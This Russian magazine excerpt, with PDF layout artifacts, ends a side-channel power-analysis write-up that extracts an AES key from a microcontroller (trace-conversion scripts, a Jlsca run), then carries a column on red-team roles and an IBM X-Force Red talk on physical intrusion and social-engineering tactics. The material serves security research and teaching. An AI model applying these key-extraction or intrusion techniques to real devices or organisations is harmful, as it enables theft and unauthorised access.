Теперь остается толь ко собрать все это в еди ный файл main.c, и можно
запускать процесс. Хороший момент попить чайку и подумать о том, что
делать дальше.





ПРЕДОБРАБОТКА
Через некоторое время у меня на ноутбуке уже было пять тысяч осциллог‐
рамм в формате CSV и бинарный файл с отла дочной платы. Однако
перед анализом трасс в статистическом пакете Jlsca данные предстояло кон‐
вертировать в фор мат TRS.
  Вообще говоря, предваритель но еще следова ло убедиться, что общие
паттерны на осциллограмме (пики и впадины) соответс твуют раундам алго‐
ритма AES и сами трас сы синхронизирова ны. Другими словами, нужно быть
уверенным, что мы сравниваем внутреннее состояние микроконтроллера
в одинаковые моменты времени, иначе вся осталь ная работа теряет всякий
смысл.
  Подобная рассинхро низа ция вполне может воз никнуть из‐за фазового
дрожания сигнала  (джиттер) на канале с триггером, и  тут все зависит
от характеристик твоего осциллографа, нас коль ко быстро он сможет сре аги‐
ровать и начать захват данных по основно му каналу.
  К счастью, я мог визу ально наблюдать осциллограммы на экране прибора
во время сбора трасс питания и через какое‐то время при шел к выводу, что
этот шаг вполне можно пропус тить. Одна ко в оригинальной презентации инс‐
труктору Riscure все же пришлось выравнивать трассы, преиму щественно
из‐за бюджетности модели Hantek.
  Вернемся к осциллограммам. Конечно, экспо ненциальное представление
чисел в столбцах файлов CSV тоже можно было рас парсить и сконверти‐
ровать средствами языка С. Однако я не смог найти у Riscure описания фор‐
мата TRS, зато нашелся модуль для Python.
  Напишем пару скриптов:


# Remove all timestamps from files
TOTAL = 5000


for i in range(TOTAL):
  source = open('TRC/TRC{:04}.csv'.format(i), 'r')
  target = open('traces/traces{:04}.txt'.format(i), 'w')


  source.readline() # skip header
  for line in source.readlines():
    time, volt = line.split(',')
    target.write(volt)


  source.close()
  target.close()

Теперь сольем все файлы вмес те:


# Create resulting .trs file
import numpy as npy
import trsfile as trs


TOTAL = 5000


target = trs.trs_open('result.trs', 'w', padding_mode = trs.TraceP
adding.AUTO)


bytes = open('data.bin', 'rb')


for i in range(TOTAL):
  source = npy.genfromtxt('traces/traces{:04}.txt'.format(i), dtype =
 float)
  target.append(trs.Trace(trs.SampleCoding.FLOAT, source, data =
bytes.read(32)))


bytes.close()
target.close()

В модуле numpy уже содержится готовый метод для чтения последователь‐
ностей из текстовых файлов, поэто му весь код простой до безобразия.
На выходе должен получиться внушительный файл со всеми трассами
и парами «открытый текст — шифртекст».
   Кстати, если будешь повторять это все в macOS, обрати внимание, что
модуль trsfile исполь зует mmap для работы с файлами .trs, а операционка
Apple не поддерживает изменение раз мера уже размещенного в памяти фай‐
ла. Так что скрипт будет пос тоянно выдавать ошиб ку. Самый простой вари‐
ант — перейти в Linux и соб рать файл там, что я и сделал с помощью Ubuntu
в виртуалке.


КТО ТАКАЯ JULIA
Анализировать полученные данные предстоит с помощью пакета  Jlsca.
Это еще одна открытая разработка компании Riscure (ты можешь свободно
скачать ее на GitHub). Утилита написана на молодом язы ке Julia, что в теории
обещает хорошую производительность при сложных вычислениях и научных
расчетах.


        WWW

                     Подробнее о языке  Julia ты можешь прочесть
                        в статье «Hey Julia! Новый язык, который выг‐
                         лядит, как Python, а летает, как C».


Аргументы при запуске переда ются программе несколько необычным обра‐
зом — через имя файла. Нужно ука зать алгоритм, режим шифрования
и (опционально) правильный ключ. В моем слу чае название получи лось
таким: aes128_sb_ciph_47f1ed9166c996b2f553b147be3fbc20.
  Кроме того, раз мы вычисляем вес Хэмминга для наших данных, нужно
добавить соответствующую строчку в файл main‐condavg.jl.


params.analysis.leakages = [HW()]

Скрестить ли пальцы на уда чу? Вот еще, какие глу пости.


$ julia examples/main‐condavg.jl aestraces/aes128_sb_ciph_47f1ed916
6c996b2f553b147be3fbc20.trs

Скажу честно, сразу получить правильный результат мне не удалось. Свою
первую попытку я испортил тем, что невнимательно прочитал принципиаль‐
ную схему платы и не удалил все нужные конденсаторы в цепи питания. Мало
того, я забыл добавить к трассам наборы «открытый текст — шифртекст».
Как итог, программа и близко не смогла угадать ни одного правильного байта
в ключе.
   Второй подход оказался удачнее, но, видимо, мне не хватило размера
выборки. Я собрал тысячу осциллог рамм с устрой ства в момент шифрования,
и результаты были гораз до лучше — коэффици енты для нужных байтов
попали в топ‐10, и это обнадеживало. Однако соотношение шумов и полез‐
ного сигнала все еще было далеко от идеала.
   Успешной оказалась лишь третья попытка, но, наверное, и это неплохой
результат! Приш лось увеличить мас сив данных в пять раз, а также перес‐
мотреть схему питания, добавив внеш ний регулятор напряжения на 3,3 В.
Не знаю, сыграло это свою роль или нет, но в качестве источника электро‐
энергии я выбрал не внешний акку мулятор с Li‐Pol и импульсным DC/DC‐пре‐
образователем, а обычную батарейку на 9 В.


ПОДВОДИМ ИТОГИ
Если попытаться описать мои впечатления от проделанной работы одним
словом, то, наверное, лучше всего подойдет сло во «смешанные». С одной
стороны, это было безумно интересно, по ходу дела пришлось решить нес‐
колько нетривиальных проб лем, разобрать ся в новых для себя вещах, и в
целом о потраченном времени я нисколько не жалею.
  Более того, стоит признать, что подобные атаки действительно сле дует
рассматривать в числе угроз для безопас ности устройства и конфиденциаль‐
ности пользовательских данных. Конечно, вытащить ключ шиф рования с сов‐
ременного микроконтроллера на ядре ARM оказалось не так просто, как в
случае с его предком на AVR, да и оборудо вание для атаки пришлось исполь‐
зовать более дорогое. Но принципиальных отличий, как видишь, оказалось
немного.
  С другой стороны, исследова тель из Riscure в сво ем выступлении заявлял,
что сегодня атаки по второс тепенным каналам уже могут совершать чуть ли
не скрипт‐кидди. Не знаю, возможно, он имел в виду изначальный конкурс
RHme2, или у них в Евро пе какие‐то другие скрипт‐кидди, уровнем сущес‐
твенно выше наших. В любом случае лично у меня общая подготовка к атаке
и перенос примера на актуальное железо заняли немало времени.


Допол нитель ные матери алы
Разобрав в деталях сущес тву ющую угрозу, нельзя не сказать пару слов о спо‐
собах защиты от нее. Тут я вряд ли при думаю что‐то новое, но могу пореко‐
мендовать несколько хороших источников, где ты точно найдешь полезную
информацию. В первую очередь это сборник рекомендаций компании Riscure
для разработчиков и специалис тов по безопасности Secure Application Pro‐
gramming. Кроме того, зас луживает изу чения и материал «Атаки на встра‐
иваемые системы» компании BI.Zone. АВК по энергопотреблению и АМИС
по питанию там разоб раны дос таточно подробно.



ПОСТСКРИПТУМ
Лично для меня вопрос с подобного рода угро зами еще не закрыт. Во‐пер‐
вых, хотелось бы найти подходящее устройство и провес ти эксперимент
в условиях, максимально приб лиженных к реаль нос ти. Во‐вторых, кому нужна
программная реализация шифрования, если сегодня во встраиваемых сис‐
темах вообще и микроконтроллерах в час тности появляются аппаратные
ускорители криптографичес ких вычислений?
   Уязвимы ли они перед такими ата ками и нас коль ко это вооб ще реально
с бюджетным оборудованием — подоб ный момент заслуживает самого вни‐
мательного изучения. Во вся ком случае, я намереваюсь вернуться к АВК
через некоторое время и, воз можно, появлюсь с новым материалом. Если,
конечно, ты меня не опередишь.
ВЗЛОМ

RED TEAM:
РОЛИ И ОБЛАСТИ
ЭКСПЕРТИЗЫ





    КОЛОНКА ДЕНИСА МАКРУШИНА





Красная команда имитирует действия ата‐
кующего, чтобы помочь оценить эффектив‐
ность защитных мер и улучшить безопас‐
ность. В этой статье я разберу, как устро‐         Денис Макрушин
                                                                                      Специализируется на
                                                                                      исследовании угроз иены такие команды и какие нужны области
                                                                                        разработке технологий
                                                                               защиты от целевых атак.экспертизы для успешной реализации  kill                                                                                                   #InspiredByInsecure
                                                                                          condifesa@gmail.comchain и демонс трации результатов.


В прошлый раз мы познакомились с ключевыми целями и показателя ми
эффективности Red Team для процес сов ИБ и бизнеса в целом. Мы рассмот‐
рели особенности взаимодействия экспертов нас тупательной безопасности
c Blue Team, нюан сы ведения проектов и коммуникации во время работ.
При этом мы практически не коснулись внут ренней структуры крас ной коман‐
ды. Пора исправить это!


ОБЛАСТИ ЭКСПЕРТИЗЫ
Рабочий процесс Red Team мало чем отличает ся от работы R&D‐отдела
обычной IT‐компании: та же стандартная схема «иссле дование — разработ‐
ка — развертывание — поддержка — ана лиз результатов».
   Если не брать в рас чет специфику некоторых наступательных мероп‐
риятий,   требующих   экзотичес кой  экспертизы   (например,  эксперта
по управлению дронами для дос тавки «полез ной нагрузки» в целевую
физическую инфраструктуру), то мож но выделить ряд базовых спе циали‐
заций:
 • про ектный менед жер — отвечает за планирование и организацию
   рабочего процесса внут ри команды, а также взаимодействие с ключевыми
   фигурами в компании (на английском их обычно называют stakeholders);
 • ин женер — берет на себя раз работку тулз, требующихся для реализации
   проекта, и автоматизацию задач;
 • опе ратор — отвечает за раз вертывание, поддержку инструментов авто‐
   матизации и их конфигурирование в соответствии с потребностями про‐
   екта;
 • аналитик — обрабатывает получен ные данные, а также составляет TTPs
    (tactics, techniques and procedures) для достижения целей на каждом
   из этапов kill chain.

Если бюджет ограничен, некоторые из перечис ленных специализаций могут
прекрасно сочетаться в одном человеке. Но мы не будем заострять внимание
на количестве людей в команде, а выделим области экспертиз Red Team, что‐
бы на их основе вывести роли.
  Ключевое отличие эксперта красной команды от коллег в индустрии —
это «наступательная» специфика в его задачах. Дру гими словами, разработ‐
чик в Red Team применя ет свои знания для достижения, казалось бы, дес‐
труктивных целей (к примеру, выполнение про извольного кода на рабочей
станции сотрудника и сокрытие этого от средств защиты, чтобы создать
еще одну «точку присутствия» в инфраструктуре), но при этом в масштабах
бизнеса эти цели конструктивны и служат оценке эффективности средств
защиты и процессов реагирова ния на инци денты. Или, например, DevOps‐
инженер превращается  в  ботмастера и деп лоит фермы C2‐серверов
для вывода данных из инфраструктуры и пос леду ющей их обработки. Наде‐
юсь, ты уловил эту специфику.
   Если разбить множес тво экспертиз внутри крас ной команды на четыре
больших домена (Research, Engineering, Operations, Management), то получит‐
ся картина, в которой каждый из этих доменов свя зан с другими.





                Об ласти «крас ной» экспертизы

Области менеджмен та и исследования в определенной сте пени необходимы
для любого эксперта Red Team. Каждый участник команды должен уметь оце‐
нить ключевые этапы своей части работ и необходимые ресурсы на каждом
из этих этапов, а также уметь донести результаты работы до ключевых лиц
(своего руководите ля, экспертов Blue Team, биз нес‐персон) в понятной им
форме.
  При этом каждый эксперт не живет в ваку уме и во время работы тесно вза‐
имодействует с другими экспертами красной команды. Это значит, что
управление про ектами — важная компетенция для любого спе циалиста нас‐
тупательной безопасности.
  Область исследований также фундаментальная и касается спецов любого
профиля внутри Red Team. Даже проектный менеджер должен регулярно про‐
водить исследовательские работы в области нас тупательной безопасности,
чтобы понимать TTPs и быть в тренде их развития. Это поможет ему сос‐
тавлять дорожную карту проекта, оценивать клю чевые  этапы и вре мя
на реализацию каждого этапа. При этом очевидно, что все технические спе‐
циалисты должны вести регулярные исследова ния в релевантных областях.
  Менеджмент и исследова ния — фундаментальные задачи, с которыми
столкнется любой эксперт Red Team. Поэтому при планировании работ всег‐
да необходимо закладывать время на исследования (в большей степени)
и управление проектами (в мень шей степени на классичес кий менеджмент
и в большей — на прокачку навыков репортинга и коммуникации).
   Engineering и Operations — раз делы экспертизы, среди которых эксперту
придется сделать выбор. Наверняка можно быть девопсом в области нас‐
тупательных операций, но вот качес тво и эффективность этих операций тре‐
буют узкого фокуса. Рассмотрим возможные роли, которые так или иначе
находятся в рамках этих областей.


РОЛИ RED TEAM
Ключевые роли Red Team формиру ются из областей экспертизы. Несколько
областей экспертиз могут сос тавлять про филь для одного из экспертов,
но важно, чтобы эти профили как мож но меньше пересе кались между собой,
иначе может получиться команда, которая зна ет все про тестирование
на проникновение, но при этом ничего не понимает в безопасности веб‐при‐
ложений. Или команда, которая прекрасно умеет использовать готовые тул‐
зы, но при этом не может разрабатывать кас томные средс тва хотя бы
на уровне прототипа. Диверсифика ция экспертизы — основополагающая
задача при постро ении команды.





          Ключевые навыки для построения профиля эксперта


Раз работчик
Рассмотрим клю чевые характеристики разработчика красной команды.
 • Ско рость раз работки MVP (minimal viable product) для исполь‐
   зования внутри команды, а также для переда чи Blue Team. Скорость раз‐
   работки в усло виях реализации атаки — важ ное требование, которое при‐
   носит в жертву качество кода, но при этом позволя ет другим членам
   команды достигать пос тавленных целей.
 • По нимание прин ципов работы основных защитных решений.
  Знакомство с лучшими практиками и архитектурой решений (платных про‐
   дуктов и открытых утилит) поз волит не только сэкономить время, но и
   в некоторых случаях избежать нежелательного детекта со стороны этих
   самых решений, которые использует Blue Team. Другими словами, если
   перед  разработчиком  стоит  важ ная  задача  не  скомпрометировать
   работой своего кода всю нас тупательную операцию, то понимание тех‐
   нологий детекта увеличивает шансы на успех.
 • Опыт  раз работки  средств  эксплу атации.  Этот  навык  требует
   отдельного эксперта, который может вооб ще не иметь двух описанных
  выше характеристик, но при этом должен отлично разбираться в экспло‐
   итостроении и методах обхо да современных технологий Exploit Prevention.
   Работая в связке с экспертом Vulnerability Research, он существенно сок‐
  ращает время реализации ста дий Weaponization и Exploitation целевой ата‐
   ки (см. kill chain в моих предыду щих материалах). И кроме этого, его раз‐
   работки могут снова применяться в дру гих про ектах, реализуемых этой
   командой.


Иссле дователь уяз вимостей (багхантер)
Багхантером мы называем прежде всего эксперта, который умеет эффектив‐
но находить  уязвимости в выделен ных для него доменах: дес ктопных,
мобильных и веб‐приложениях, а также любых дру гих.
   Здесь много специфики, и вряд ли с ней может быть знаком один человек,
однако понимание того, с чем Red Team чаще всего сталкивается в своих
проектах, позволяет сформировать конкрет ные потребности в профиле
человека. Мой опыт подска зывает, что ресерчер в области веб‐приложе‐
ний — обязательная компетенция в Red Team, потому что веб есть практичес‐
ки на всех периметрах орга низа ций раз ного уровня и профиля биз неса.


Ад министратор (DevOps-инже нер)
Эксперт, отвечающий за инфраструктуру команды. В частности, в его обязан‐
ности входит поддержание работы С2‐серверов (с которых импланты получа‐
ют команды и на которые производится эксфиль трация данных), а также
работы серверов для рассылки фишинга.


Penetration Testing
Тот самый навык, который по воз можности должен быть у каждого члена
команды, включая аналитика, готовящего репорты. Каждый из участников
должен уметь «запавнить» любую basic‐level рабочую станцию на сервисе
вроде Hack the Box.
  Я не буду в деталях рассматривать требова ния для эксперта этого про‐
филя, потому что о тес тировании на проникновение материалов и так дос‐
таточно.


Reporting
Как я уже отметил, навык коммуникации — это базовое требование для спе‐
циалистов любой команды. Именно поэтому очень важно уметь демонс три‐
ровать и передавать в нужной форме результаты своей работы кол легам.
Но если коммуникацию внутри команды можно орга низовать просто удобно
для всех (например, в виде переписки в «Телеграме»), то коммуникация
с внешними стейкхол дерами должна быть максималь но четкой.
  По этой причине в команде должен быть выделенный эксперт, который
понимает результаты работы каждого учас тни ка и умеет интерпре тировать их
внешним специалистам (и нес пециалистам). Чаще всего эта экспертиза ока‐
зывается у менеджера (лидера) Red Team либо у ана литика, который отвечает
за подготовку отчета.


Training
Казалось бы, этот навык «обучения дру гих» нужен кому угодно, кроме тех‐
нических экспертов. Однако, как я отмечал в предыдущей статье, одна
из ключевых целей Red Team — повышение эффективности работы Blue
Team, и именно для ее реализации требуется качественный процесс обу‐
чения, который получается на основе результатов работы Red Team.
  Для проведения эффективного тренин га необходимо четко понимать про‐
белы в процессах Blue Team и уметь предос тавлять решение в удобоваримой
форме.


ОТТЕНКИ КРАСНОГО
Как ты понимаешь, описанное разделение ролей весьма условно и многие
экспертизы тесно переплета ются между собой. Однако моя задача состоит
не в классификации, а в предос тавлении более‐менее ясной картины тех
областей, в которые ты можешь углубить ся, чтобы обрести четкий фокус сво‐
его развития в качестве эксперта наступательной безопасности.

Нуж на обратная связь!
Наверняка какие‐то из описанных областей экспертизы не оставили тебя
равнодушным. Напиши в комментариях, в каком направлении ты хотел бы
развиваться. Подведя ито ги, я смогу на них ори ентироваться при подготовке
материала о том, какие ресурсы, тренин ги, статьи и лайфхаки помогут про‐
качать нужные навыки.
ВЗЛОМ
        IBM
    X-FORCE
       RED



             КАК КРАСНАЯ КОМАНДА IBM
            ПРОВЕРЯЕТ ОРГАНИЗАЦИИ
                     НА ПРОЧНОСТЬ





                                                                           Чарльз Хендерсон





У моего сына как‐то спро сили в шко ле: «Кем работает твоя
мама?» Он  сказал — медсестрой. А  когда  спросили
про папу, он отве тил: «Мой папа кра дет вещи, но это нор‐
мально, потому что ему за это пла тят!» Как видите, работать
в красной команде — это не самая обыкновенная карьера. Я
расскажу о том, как пришел к ней, с самого начала, и это
объяснит многое из того, чем мы занима емся.


             INFO

                      Эта статья написана редакцией «Хакера» и пред‐
                         ставляет собой близкий перевод на русский язык
                     выступления Чарльза Хендерсона на конферен‐
                      ции IBM Security Summit. В кон це статьи ты най‐
                     дешь ответы на воп росы, которые Хендерсону
                       задал  корреспон дент  «Хакера»  и  журналисты
                       из других изданий.


Вот я на DEF CON в 1996 году [показывает фотографию лохматого молодого
человека в футболке и джинсах, в руках стакан с прохладительным напитком,
рядом  несколько  товарищей].  Теперь  это  крупнейшая  конференция
по безопасности во всем мире: в Вегас на нее приезжает 38 тысяч человек.
В 1996 году нас было около ста человек.
  На заднем плане на этом снимке можно раз глядеть людей, которые
используют RadioShack Pocket Dialer, чтобы бесплат но звонить с таксофона.
Устройство издавало  в  труб ку  звуки, идентичные  звуковым командам,
которые аппарат передавал телефонной станции. Компьютер на том конце
думал, что пользователь положил в монетоприемник четвертак (точнее, пять
монет по пять центов одну за другой — и опыт ные опе раторы могли
по отсутствию задержек между сигналами на слух заметить нелад ное). Я,
конечно, таким не занимался — у меня хороший моральный компас, и это
очень важно в моей работе.
  Но в целом люди, которые были на той конференции, теперь заправляют
современным бизнесом наступательной безопас ности. Мы находим бре ши
в защите до того, как это сделают зло умышленники.
  Лю ди иногда спрашивают меня, зачем я занима юсь тем, чем занимаюсь.
Взгляните на эту фотог рафию. Знаете, что это?





Это Commodore 64, на котором работа ет Twitter. Такого приложе ния, как нес‐
ложно догадаться, на Commodore 64 не было, когда он продавал ся в магази‐
нах. Зачем делать такие вещи? Чтобы доказать, что они воз можны!
   Хакерство и наступатель ная безопасность в целом — это когда ты исполь‐
зуешь вещи так, как их использовать не предполагалось. Например, зас‐
тавить веб‐приложение дать нам доступ к базе данных. Или взломать замок
и проникнуть в здание (да, моя команда лома ет замки!). Мы постоянно пыта‐
емся заставить организации, сети, приложения, домашние гаджеты и даже
автомобили сделать что‐то, для чего они не предназначались.
   White Hat, Grey Hat, Black Hat — это все не прос то названия, это стили жиз‐
ни. То есть моральный компас — это не прос то сознательный выбор,
это что‐то, с чем ты живешь. И наш способ уси ления безопасности немного
не такой, как у остальной индус трии. Все занима ются улучшением механиз‐
мов безопасности, моя же команда сос редоточена на проникновении, и для
этого нужен другой образ мышления. Но мораль ные приоритеты должны быть
теми же. И цели у нас — те же.


X-Force Command Cyber Tactical Operation Center
Из всего показанного на IBM Security Summit, пожалуй, наиболее примеча‐
телен был грузовик под наз ванием IBM X‐Force Command Cyber Tactical Oper‐
ation Center (C‐TOC). Это мобильный командный центр, спроектированный
по военному образцу.





В развернутом виде центр представляет собой небольшой офис с компьюте‐
рами и телефонами на столах. C‐TOC может быть использован двумя раз‐
ными способами. Его основное предназна чение — это тре нировки пер‐
сонала. Центр разворачивается поблизости от офиса компании, после чего
команда сотрудников использует его для интенсивного тренинга, в котором
моделируется экстренная ситуация (нап ример, атака или утечка данных).
Полный контроль над происхо дящим внут ри позволя ет достичь высокой сте‐
пени реализма.
   Расположившись за сто лами, сотрудни ки, про ходящие тренинг, получают
звонки, работают за компь ютерами и сооб ща стараются пре дотвратить
моделируемую угрозу или нивелировать ее последс твия. По словам предста‐
вителей IBM, это позволя ет как повысить подготовленность команды реаги‐
рования, так и заставить руководс тво компании попасть на их место и самос‐
тоятельно оценить риски.
   Второе предназначение C‐TOC — доставлять команду специалис тов IBM
на место инцидента, чтобы те имели воз можность оказать максимальную
поддержку.


Знаете, что мне нравится в моей работе? Что бы я ни делал, я не окажусь
в тюрьме. Неплохо, правда? Я руково жу командой под названием X‐Force
Red. Мы — адвокаты дьявола в мире безопас ности и раз за разом доказы‐
ваем, что возможны вещи, о которых никто не предполагал. Мы протестируем
ваш софт и ваши IoT‐девайсы и зас тавим их делать то, что они не должны
делать.
  Но для этого требуется определенный уровень автономности. Если в IBM
разрабатывают новое средство защиты и мы тестируем его, то нам нужно
иметь независимый от остальной команды ста тус. Поэтому мое подразде‐
ление — это глобальная организа ция, которая орга низационно внутри IBM
Security, но в реальности немного в стороне от остальных. И это, кстати,
заметно сразу. Говорят, у наших сотрудников больше цветов волос, чем
во всей остальной IBM.
  Мы занимаемся не толь ко тес тированием безопасности наших клиентов,
мы занимаемся ее тестированием вооб ще. И я не имею в виду, что у нас тут
криминальная организация. Я имею в виду, что мы занимаемся поиском уяз‐
вимостей.
  В прошлом году на Black Hat мы предста вили наше исследование умных
городов. Мы показали, как в городах, с переходом со старых АСУ на сов‐
ременные, управляемые через интернет, час то ста вят устройства с простей‐
шими уязвимостями: это могут быть зашитые пароли, передача нешифрован‐
ных данных и так далее.
  Меньше чем за неделю мы наш ли способ скомпромети ровать оборудо‐
вание на гидроэлектростанциях по всей стра не. Даль ше мы оповестили про‐
изводителей о проб леме, посодействовали пра вительствам городов в ее
устранении и, конечно, опубликова ли отчет толь ко после этого. К этому
моменту было запатчено более тысячи уяз вимых устройств.


АВТОМОБИЛЬ, КОТОРЫЙ НЕ ЗАБУДЕТ
Я и сам иногда занимаюсь исследованиями. Вот простой случай из жизни —
я нашел уязвимость в собственной машине. Я тогда купил кабриолет,
о котором мечтал. Пришлось, кстати, проделать серьезнейшую работу
по социальной инженерии, что бы уговорить на это жену, — я рас сказал, что
туда будет удобнее через верх сажать маленького ребенка (не говорите ей,
пожалуйста, но ее сомнения, кажется, были оправданными).
  Но в целом это была потрясающая машина — одна из первых по‐нас‐
тоящему подклю ченных к Сети. Навигация, спутниковое радио, мобильное
приложение, из которо го можно было делать что угод но: искать машину,
открывать замки, заводить мотор, сигналить и так далее.
  Поскольку жена все же со временем взя ла верх в нашем споре, мне приш‐
лось вернуть эту машину в салон и взять ту же модель, но с обычным кузовом.
Я, конечно, предварительно стер все свои данные и сбросил настрой ки
к заводским. Но через какое‐то время я заметил, что в приложении по‐преж‐
нему могу видеть бывший мой автомобиль. И он не исчез оттуда ни на сле‐
дующий день, ни через месяц.
  Через два года я обнаружил, что у меня все еще есть доступ к той машине.
Я подготовил док лад об этом и выступил с ним на конференции RSA. Я рас‐
сказал, что, по всей видимости, сотни бывших вла дельцев по‐прежнему име‐
ют доступ к своим старым авто мобилям. Я был уверен, что проблему устранят
на следующий же день. Увы, нет.
  Прошло уже шесть лет, и у меня не только есть доступ к той машине, но и
к следующей, которую я продал три года назад, и к последовавшей за ней
(все того же производителя), которую я продал в прошлом году. Юрист
говорит, что мне не стоит идти навещать свой старый кабриолет, но мне бы
очень хотелось (знаю, зву чит так себе).
  Производитель в ито ге запретил  искать автомобили по GPS, если
находишься дальше чем на километр от машины. Это, конечно, полностью
лишает смысла геоло кацию, потому что если ты рядом, то, скорее все го, зна‐
ешь, где твоя машина.
  Но главная проб лема в том, что это ограничение основано на информа‐
ции о местоположении, которую сообщает мобильный телефон. Что ж, мой
телефон может великолепно врать! Я начал сообщать о своем местополо‐
жении, меняя его таким обра зом, чтобы прос канировать все Соеди ненные
Штаты. Я обнаружил, что средний город можно обойти где‐то в 200 зап‐
росов, а менее чем за 2000 запросов можно обойти места проживания 90%
американцев.
  Я хороший человек и не буду заставлять чужие машины сигналить в три
часа ночи или пакостить как‐то еще. Но кто‐то другой впол не может. Кстати,
мы в исследовании не упомина ли название компании‐производителя, но в
какой‐то момент обнаружили, что у всех производителей система устроена
точно так же.


«ВСЕ ЛЮБЯТ ПОНЧИКИ»
В нашей практике тоже пос тоянно происходят интерес ные истории. Нап‐
ример, одну из них я окрестил «Все любят пончики». Крупная нью‐йоркская
инвестиционная компания, одна из первой сотни крупнейших компаний
в мире, наняла нас в качестве крас ной команды.
  Был выбран стиль slow and low, то есть у нас было полгода на все работы.
Это не значит, что тестирование будет проводиться пол года ежедневно,
это значит, что в течение этих шести месяцев мы собирались делать отдель‐
ные подходы. После компромета ции цели мы бы пос троили таймлайн и по
нему узнали бы, как на протяжении этого времени реагировала синяя коман‐
да.
  О том, что проходит тес тирование, знало только руководс тво компании.
По части скоупа нам дали карт‐бланш — мож но было тес тировать любые
сети, заниматься физическим проникновени ем — что угодно.
  На ранних стадиях моя команда решила провес ти небольшую раз ведку
и попытаться проникнуть в головной офис. Они даже нашли в онлайновом
магазине рюкзаки с логотипом этой компании, чтобы больше походить
на сотрудников.
  А еще они взяли с собой устройство, способ ное нарушить работу счи‐
тывателя бейджей, и  изготовили поддельные бейджи. По  их  теории,
в понедельник утром, скорее всего, достаточно было бы вывес ти из строя
считыватель, а потом показать бейдж, что бы тебя пропус тили (закрывать про‐
ход в здание охрана не решится). Они оказались правы и легко поднялись
на этаж, который занимает руководство компании.
  По дороге в офис они купили короб ку пончиков. Зачем? Дело в том, что
люди склонны доверять тем, кто приносит подарки. Они поставили короб ку
с пончиками снаружи комнаты, где проходило заседание, зашли внутрь
и объявили: «Извините за неудобство! Это срочный аудит  IT, вы должны
покинуть помещение! Можете на выходе взять пончик из коробки в качес тве
компенсации». В результате все ушли, и никто не сообщил об этом инциден‐
те.
  Первое, что сделала команда, попав внутрь, — это подключилась к локаль‐
ной сети и атаковала сис тему резервирования переговорной комнаты. Все
записи  на  ближайшую  неделю  передвинули  на  другие  переговорки.
Это добавило убедитель ности: все увидели, что их совещания передвинули
на другой этаж, и решили, что эти ребята точно свои, раз делают что‐то такое.
  Следующим шагом они ата кова ли сканер бей джей, и на второй день у них
уже были настоящие бейджи. Пока они этим занима лись, они нашли кучу дан‐
ных на сервере  SharePoint, включая данные администраторской  учетки
от системы денежных переводов SWIFT. Он давал возможность распоряжать‐
ся примерно 30 миллиардами долларов.
  Обычно, когда мы работаем в режиме slow and low, мы ждем окончания
периода, чтобы узнать, не засек ли клиент подозрительную активность, но,
если удается найти критичес кую проб лему, приходится останавливаться
и объявлять о ней.
  К концу недели я позвонил CIO этой компании и сообщил, что хотел бы
встретиться. Он сказал: «Хорошо, где?» «Как насчет переговорной комнаты
на верхнем этаже нью‐йоркско го офиса?» — спросил я. На что он ответил
мне, что он бы и рад, но там проходит IT‐аудит, и она недоступна!


КОНТРНАСТУПЛЕНИЕ
Другая инте ресная история свя зана с подрядчиком военно‐промышленного
комплекса США. На первых же переговорах нам посове товали пос тараться
сделать так, чтобы нас не зас трелили. Хороший совет! Я, кстати, впервые
за свою карьеру слышал что‐то такое и хотел бы повесить эту цитату в рамоч‐
ку.
  Работа велась в порту, и нашей задачей было проникновение в закрытую
зону. Когда члены команды прошли туда, они замети ли за собой «хвост» —
кто‐то увидел, что они направились куда не следует, и решил проконтролиро‐
вать. Их реакцией было контрнаступление, то есть они попытались ответить
на обвинение в том, что им нельзя там находить ся, своим обвинением и ска‐
зать, что следивший за ними человек сам не должен заходить на эту тер‐
риторию. Главное — начать задавать вопросы рань ше.
  Проходя в закрытую зону, каждый из команды взял с вешалки каску и надел
ее, а вот следящий забыл это сделать. Это был шанс! Как только он начал ули‐
чать нарушителей, старший член команды накричал на него за то, что тот был
без каски, и он ушел восвояси и в итоге не сообщил никому об инциденте.
  Один из младших учас тников, кста ти, заметил, что его коллега при этом
надел каску с женским именем, написанным крупными буквами. Но, воз‐
можно, это лишь сыграло на руку нарушителям. Ког да человек видит что‐то
слишком сильно выходя щее за рамки привычного, это для него может быть
дополнительным аргументом махнуть рукой и не разбираться.


СОВЕТЫ КЛИЕНТАМ
От забавных хакерских историй вернемся к мейнстримной безопас ности.
У меня есть несколь ко советов для тех, кто находится по другую сторону бар‐
рикад и укрепляет защиту.
  Первый — думайте, как хакер, во всем, что вы делаете. Конечно, все рав‐
но полезно нанять кого‐то для автоном ного тес та, но, по моему опыту, кли‐
енты, которые думают, как ата кующий, до того, как моя команда начнет с ними
работать, обычно гораздо лучше справляются со своей задачей. Даже когда
мы компрометируем их системы, они ока зываются гораздо лучше подготов‐
лены к дальнейшим действиям. В общем, это отличное мысленное упражне‐
ние, которое готовит к моменту, когда все пойдет не так. А такие моменты
случаются.
  Вто рой — тестируйте вооб ще все. Понят но, что бюджеты ограниче ны,
но часто можно найти какой‐нибудь способ. Потому что если полагаться
на удачу, то первым, кто протестиру ет вашу систему, окажется прес тупник.
  Тре тий — найденная уязвимость это хорошо. Может быть, это и звучит
тривиально, но не нужно боять ся находить уязвимос ти и не нужно убеждать
себя в том, что закрывать их слишком дорого. Нашел — закрой!


ВОПРОСЫ И ОТВЕТЫ

  — Расскажи о сво ей коман де.
 — Работа моей команды — это коммерчес кое предложение IBM своим
клиентам. Мы называем себя командой хакеров‐ветеранов. Наша мис сия —
взламывать что угодно, чтобы защитить  все. Мы постоянно тестируем
самолеты, поезда, автомобили, веб‐приложения, сети, целые организации.
Мы — глобальная команда, в которой более 200 учас тников. Мы сущес твуем
уже три года, и за это время была проделана огромная работа. Мы встречаем
некоторые совершенно уникальные проб лемы в пла не безопасности.
  — Как гло бальные атаки влияют на вашу работу?
 — После каждой гло баль ной ата ки наши рекомендации начинают воспри‐
нимать значительно серь езнее. Мы стараемся не запугивать наших клиентов
зря, мы не хотим быть тем мальчиком, который кричал «вол ки», и выс тавлять
что‐то более серьезным, чем оно есть на самом деле. Но уязвимос ти —
это серьезно, и часто орга низации предпочитают ждать, пока у них появится
пример того, как уязвимость привела к финансовым потерям, прежде чем
покрывать расходы на устранение. Точно так же, как люди начинают бережнее
относиться к своему здо ровью после того, как с ними или с их ближними слу‐
чится какой‐то серьезный недуг. Я и сам, например, начинаю есть здоровую
еду незадолго до визита к врачу и сра зу после. Индустрии ведут себя при‐
мерно так же.
  — Красные коман ды, насколько я понимаю, обыч но являются
частью организации. Вас же нанимают со сто роны. Есть ли прин-
ципиальная раз ница?
 — Синяя команда обычно часть компании. А вот в качестве красной
